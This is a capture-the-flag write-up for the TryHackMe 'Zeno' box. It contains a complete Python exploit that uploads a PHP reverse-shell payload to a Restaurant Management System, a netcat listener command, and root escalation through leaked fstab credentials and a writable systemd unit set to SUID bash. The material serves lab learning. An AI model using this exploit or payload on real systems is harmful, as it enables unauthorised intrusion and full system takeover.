# THM Zeno

A Linux (CentOS) box compromised through a vulnerable **Restaurant Management System (RMS)** file-upload exploit, with privilege escalation via credentials leaked in `/etc/fstab` (reused for a real user) and a **world-writable systemd service** triggered by a permitted `sudo reboot`.

## 2. Initial access — RMS (Restaurant Management System) file upload

##### ==🔵RMS (Restaurant Management System):==

Start a listener:

```
rlwrap -cAr nc -lvnp 4444
```

Run the exploit:

```
python3 script.py http://10.49.165.151
```

We get a reverse shell back.

###### Exploit code

> Modify:
> 1. `LHOST = ''`
> 2. `LPORT = ''`
> 3. `RHOST = ''` # Target IP
>
> Also cross-check `RPORT`, `FILENAME`, and `UPLOAD_ENDPOINT`.

```
#!/usr/bin/env python3  
import requests  
  
LHOST = ''  
LPORT = ''  
RHOST = '' # Target IP  
  
# Hardcoded info  
RPORT = '12340'  
FILENAME = 'exploit.php'  
UPLOAD_ENDPOINT = '/rms/admin/foods-exec.php'  
RS_ENDPOINT = '/rms/images/{}'  
PAYLOAD = '''<?php  
$sock=fsockopen("{}",{});  
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);  
?>'''  
  
def populate_payload(ip: str, port: str) -> str:  
return PAYLOAD.format(ip, port)  
  
def build_endpoint(host: str, port: str, endpoint: str) -> str:  
return f'http://{host}:{port}{endpoint}'  
  
def main() -> None:  
  
target = build_endpoint(RHOST, RPORT, UPLOAD_ENDPOINT)  
  
files= {  
'photo': ( FILENAME, populate_payload(LHOST, LPORT).encode(), 'text/html' ),  
'submit': 'Add'  
}  
  
# Post payload  
requests.post(target, allow_redirects=False, files=files)  
  
# Go to reverse shell  
requests.get(build_endpoint(RHOST, RPORT, RS_ENDPOINT.format(FILENAME)))  
  
if __name__ == '__main__':  
main()
```

The exploit uploads a PHP payload to `/rms/admin/foods-exec.php` (disguised as a photo) and triggers it from `/rms/images/`, giving a shell:

## 3. Privilege Escalation

> **Approach / observations:** Now that we have a foothold on the box, we look for ways of escalating privileges. Whenever I land a shell through a webpage without a user, I always look at `/var/www` for any credentials lying around in config files.
>
> I find a database password for root under a config file in the `connection` directory. I didn't get anything from the DB, so it's back to looking around for other vulnerable paths.
>
> LinPEAS comes to the rescue after almost 20 minutes of nothingness: there's a file in `/etc/fstab` with credentials for someone named `zeno`. LinPEAS also discovered a writeable file at `/etc/systemd/system/zeno-monitoring.service`.
>
> I thought I'd have to do some playing around with the service, but the creds found worked for Edward's account too. Now we can SSH into Edward's account and grab the first flag.
>
> Edward can run sudo on `/usr/sbin/reboot`, so logically we can restart a service with ease. Let's check out the `zeno` service that LinPEAS found earlier.
>
> We can change the `ExecStart` key to whatever we want, so let's give a SUID bit on `/bin/bash`. Now we need to force a restart on the `zeno` service to get it working. After a short system restart, we log back into Edward's account via SSH and cat the root flag with our new bash abilities.

### Step 1 — Get the `edward` credentials

From the current shell, run:

```
cat /etc/fstab
```

Look for the commented CIFS mount containing the `zeno` username and password. The write-ups report that these credentials were reusable for `edward`. ([AllFun](https://allfun.blog/writeups/tryhackme/zeno/?utm_source=chatgpt.com))

Try switching users:

```
su - edward
```

Enter the password discovered in `/etc/fstab`. If successful, verify access:

```
whoami
id
```

### Step 2 — Verify `edward`'s sudo permissions

Once you're `edward`, run:

```
sudo -l
```

The documented configuration grants permission to reboot without a password:

```
(ALL) NOPASSWD: /usr/sbin/reboot
```

This matters because restarting the machine causes systemd to start enabled services. ([Reelix](https://www.reelix.za.net/2021/11/tryhackme-zeno-writeup.html?utm_source=chatgpt.com))

### Step 3 — Understand the root escalation

We already discovered the crucial service:

```
/etc/systemd/system/zeno-monitoring.service
```

It contains:

```
[Service]
Type=simple
User=root
ExecStart=/root/zeno-monitoring.py
```

And we've confirmed that it's world-writable.

The write-ups exploit this combination:

1. Modify the service's `ExecStart` configuration.
2. Use `edward`'s permitted reboot command to restart the machine.
3. Let systemd execute the modified service as root.
4. Verify elevated privileges and retrieve `/root/root.txt`.

One documented approach creates a root-owned SUID Bash copy; another changes `ExecStart` to execute a command that grants `edward` passwordless sudo. ([Reelix](https://www.reelix.za.net/2021/11/tryhackme-zeno-writeup.html?utm_source=chatgpt.com))

**Next action:** Run `cat /etc/fstab` and review the output — we need to get into `edward` before proceeding with the final escalation.

## Lessons Learned

- **Non-standard HTTP ports still host web apps.** Port 12340 served the vulnerable RMS.
- **Filter default-page noise when fuzzing.** `--exclude-length 3897` cut through the custom 404 and revealed `/rms/`.
- **Check `/var/www` config files for DB creds** on any www-data/apache shell — cheap and often fruitful.
- **`/etc/fstab` can leak credentials** (CIFS/NFS mount passwords), and those creds are frequently reused for a real local user.
- **World-writable systemd unit + a `sudo reboot` right = root.** Edit `ExecStart` (e.g. SUID `/bin/bash`), reboot to let systemd run it as root.
